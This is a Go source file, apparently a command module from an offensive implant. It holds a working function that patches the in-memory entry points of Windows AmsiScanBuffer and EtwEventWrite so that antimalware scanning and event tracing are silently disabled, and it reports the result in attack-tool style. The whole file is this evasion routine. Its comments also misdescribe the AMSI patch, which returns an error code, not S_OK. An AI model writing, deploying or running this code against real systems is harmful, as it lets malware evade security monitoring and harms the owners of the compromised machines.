//go:build windows
// +build windows

package commands

import (
	"fmt"
	"syscall"
	"unsafe"
)

// PerformRetPatch applies a simple ret (0xC3) patch at the entry point of the
// specified function. This causes the function to immediately return when called,
// effectively neutralizing it.
//
// For AmsiScanBuffer: ret causes it to return with whatever is in RAX (typically 0/S_OK
// from the caller's prior state), and the AMSI_RESULT output parameter is left at its
// initialized value (AMSI_RESULT_CLEAN = 0).
//
// For EtwEventWrite: ret causes it to return 0 (STATUS_SUCCESS).
//
// This is the simplest and most reliable patching approach — no gadget search,
// no JMP calculation, no VEH handler. Just a single-byte memory write.
func PerformRetPatch(dllName, functionName string) (string, error) {
	// Load the target DLL
	dll, err := syscall.LoadDLL(dllName)
	if err != nil {
		return "", fmt.Errorf("failed to load %s: %v", dllName, err)
	}

	// Resolve the function address
	proc, err := dll.FindProc(functionName)
	if err != nil {
		return "", fmt.Errorf("failed to find %s in %s: %v", functionName, dllName, err)
	}

	funcAddr := proc.Addr()

	patchBytes := []byte{0xC3}
	if functionName == "AmsiScanBuffer" {
		patchBytes = []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3} // mov eax, 0x80070057; ret
	}
	patchLen := uintptr(len(patchBytes))

	// Save original bytes for reporting
	originalBytes := make([]byte, patchLen)
	for i := uintptr(0); i < patchLen; i++ {
		originalBytes[i] = *(*byte)(unsafe.Pointer(funcAddr + i))
	}

	// Change memory protection to PAGE_EXECUTE_READWRITE so we can write
	procVirtualProtect := kernel32.NewProc("VirtualProtect")
	var oldProtect uint32
	ret, _, err := procVirtualProtect.Call(
		funcAddr,
		patchLen,
		uintptr(PAGE_EXECUTE_READWRITE),
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		return "", fmt.Errorf("memory protection change failed: %v", err)
	}

	// Write the patch at the function entry point
	for i := uintptr(0); i < patchLen; i++ {
		*(*byte)(unsafe.Pointer(funcAddr + i)) = patchBytes[i]
	}

	// Restore original memory protection
	var discardProtect uint32
	procVirtualProtect.Call(
		funcAddr,
		patchLen,
		uintptr(oldProtect),
		uintptr(unsafe.Pointer(&discardProtect)),
	)

	output := fmt.Sprintf("[+] Ret patch applied: %s!%s at 0x%X\n", dllName, functionName, funcAddr)
	output += fmt.Sprintf("[+] Overwrote 0x%X with 0x%X\n", originalBytes, patchBytes)

	return output, nil
}
